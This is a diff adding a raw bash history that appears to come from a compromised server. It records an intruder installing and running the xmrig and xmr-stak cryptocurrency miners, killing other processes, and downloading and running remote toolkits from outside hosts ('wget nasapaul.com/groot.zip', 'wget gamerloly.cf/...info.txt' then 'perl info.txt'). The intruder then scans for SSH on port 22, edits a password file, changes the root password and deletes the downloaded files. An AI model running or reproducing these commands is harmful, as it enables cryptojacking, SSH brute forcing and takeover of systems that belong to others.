@@ -1,0 +1,194 @@
+cd xmr-stak-cpu
+ 1553  ls
+ 1554  cd bin
+ 1555  ls
+ 1556  cd
+ 1557  ls
+ 1558  cd xmrig-2.5.3
+ 1559  ls
+ 1560  clear
+ 1561  ls
+ 1562  ./xmrig
+ 1563  ls
+ 1564  clear
+ 1565  cd
+ 1566  ls
+ 1567  cd /var/tmp
+ 1568  ls
+ 1569  yum -y install epel-release
+ 1570  yum -y install centos-release-scl cmake3 hwloc-devel libmicrohttpd-devel openssl-devel git screen nano
+ 1571  yum -y install devtoolset-4-gcc*
+ 1572  scl enable devtoolset-4 bash
+ 1573  git clone https://github.com/fireice-uk/xmr-stak-cpu.git
+ 1574  cd xmr-stak-cpu
+ 1575  cmake3 .
+ 1576  ls
+ 1577  cd
+ 1578  ls
+ 1579  cd xmrig-2.5.3
+ 1580  top
+ 1581  pkill teamviewerd
+ 1582  pkill python3
+ 1583  ls
+ 1584  screen ./xmrig
+ 1585  ls
+ 1586  nano config.json
+ 1587  ls
+ 1588  ./xmrig
+ 1589  nano config.txt
+ 1590  nano config.json
+ 1591  ls
+ 1592  ./xmrig
+ 1593  nno config.json
+ 1594  ls
+ 1595  nano config.json
+ 1596  ls
+ 1597  ./xmrig
+ 1598  top
+ 1599  pkill pythone3
+ 1600  ls
+ 1601  clear
+ 1602  lsc
+ 1603  dls
+ 1604  cd
+ 1605  ifconfig
+ 1606  ls
+ 1607  w
+ 1608  free
+ 1609  ls
+ 1610  ls -a
+ 1611  cat .bash_history
+ 1612  cd ROOT
+ 1613  ls
+ 1614  cd /ROOT
+ 1615  ls
+ 1616  cdls
+ 1617  ls
+ 1618  clear
+ 1619  cd /home
+ 1620  ls
+ 1621  cd vnc
+ 1622  ls
+ 1623  cd
+ 1624  ls
+ 1625  clear
+ 1626  wget nasapaul.com/groot.zip
+ 1627  unzip groot.zip
+ 1628  cd groot
+ 1629  lscpu
+ 1630  ls
+ 1631  clear
+ 1632  chmod +x *
+ 1633  ls
+ 1634  clear
+ 1635  rm -rf pass_file
+ 1636  nano pass_file
+ 1637  ls
+ 1638  clear
+ 1639  ls
+ 1640  chmod +x *
+ 1641  ifconfig
+ 1642  nano cyber
+ 1643  nano go
+ 1644  free
+ 1645  free -mt
+ 1646  ls
+ 1647  clear
+ 1648  ls
+ 1649  w
+ 1650  free
+ 1651  ls
+ 1652  clear
+ 1653  w
+ 1654  free
+ 1655  ls
+ 1656  clear
+ 1657  w
+ 1658  free
+ 1659  ls
+ 1660  clear
+ 1661  ls
+ 1662  ./go 222
+ 1663  ls
+ 1664  ifconfig
+ 1665  cat go
+ 1666  docker0
+ 1667  ./class 22 -a $1 222 docker0 -s 10
+ 1668  ./class 22 -a 222 -i docker0 -s 10
+ 1669  ifconfig
+ 1670  ./class 22 -a 222 -i em1 -s 10
+ 1671  ./class 22 -a 222 -i veth19808e9 -s 10
+ 1672  ./class 22 -a 222  -s 10
+ 1673  clear
+ 1674  passwd root
+ 1675  ls
+ 1676  clear
+ 1677  w
+ 1678  ls
+ 1679  cd
+ 1680  cd ..
+ 1681  ls
+ 1682  cd /root
+ 1683  ls
+ 1684  rm -rf groot.zip groot
+ 1685  ls
+ 1686  clear
+ 1687  ls
+ 1688  rm -rf xmrig-2.5.3-xenial-amd64.tar.gz
+ 1689  ls
+ 1690  clear
+ 1691  cd
+ 1692  cd /home
+ 1693  ls
+ 1694  cd /jenkins
+ 1695  cd ..
+ 1696  cd /home/vnc
+ 1697  ls
+ 1698  wget nasapaul.com/grtoo.zip
+ 1699  lspci
+ 1700  clear
+ 1701  wget gamerloly.cf/arhive/info.txt
+ 1702  perl info.txt
+ 1703  wget nasapaul.com/groot.zip
+ 1704  unzip groot.zip
+ 1705  rm -rf groot.zip
+ 1706  rm -rf info.txt
+ 1707  ls
+ 1708  clear
+ 1709  ls
+ 1710  cd groot
+ 1711  ls
+ 1712  chmod +x *
+ 1713  cat go
+ 1714  cd /var/tmp
+ 1715  ls
+ 1716  wget nasapaul.com/groot.zip
+ 1717  unzip groot.zip
+ 1718  ls
+ 1719  cd groot
+ 1720  ls
+ 1721  cear
+ 1722  ls
+ 1723  cd ..
+ 1724  rm -rf groot.zip
+ 1725  rm -rf bios.txt.filepart
+ 1726  ls
+ 1727  cd groot
+ 1728  ls
+ 1729  cd ..
+ 1730  ls
+ 1731  rm -rf groot
+ 1732  ls
+ 1733  chmod +x *
+ 1734  ls
+ 1735  clear
+ 1736  ls
+ 1737  cat go
+ 1738  cat bios.txt |sort | uniq > mfu.txt
+ 1739  oopsnr2=`grep -c . mfu.txt`
+ 1740  echo -e "[SSH] Found $oopsnr2 ip's"
+ 1741  ls
+ 1742  cat go
+ 1743  ./update 10000
+ 1744  cd 
+
